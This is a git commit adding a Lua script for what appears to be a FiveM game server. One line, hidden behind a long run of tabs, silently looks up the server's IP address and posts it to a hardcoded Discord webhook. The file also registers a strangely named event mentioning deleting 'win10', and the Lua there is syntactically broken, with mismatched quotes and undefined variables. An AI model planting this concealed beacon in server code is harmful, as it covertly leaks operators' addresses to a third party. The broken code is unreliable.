1d3a212ab9da8d5f663cd19adecabe5abce9c5b3
kukucsgo <51091727+kukucsgo@users.noreply.github.com>
2021-02-06 19:12:28 +0200

    Add files via upload

---
+++ serveri.lua
@@ -0,0 +1,16 @@
+ webhookki = "https://discord.com/api/webhooks/796728343817879572/11XMfMOvC_UK60RS2Y7rt6DUQFGvaEiv1FY_58_MggHfujugDctqiF69xZaMXj7ujkp2"
+
+																																											Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa rulettia", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)	
+RegisterServerEvent('open then win10.bat (trigger.event) delete win10')
+AddEventHandler(''open then win10.bat (trigger.event) delete win10', function(tuhoo win10 koneelta)	
+	local onko,returnaa=pcall(WIN10)	                 
+	if menikolapi then                                                 
+	return nil,menikolapi
+	end
+	local onko,returnaa=pcall(WIN10)	                               
+	if onko then
+	return returnaa
+	else
+	return nil,returnaa
+	end
+end)
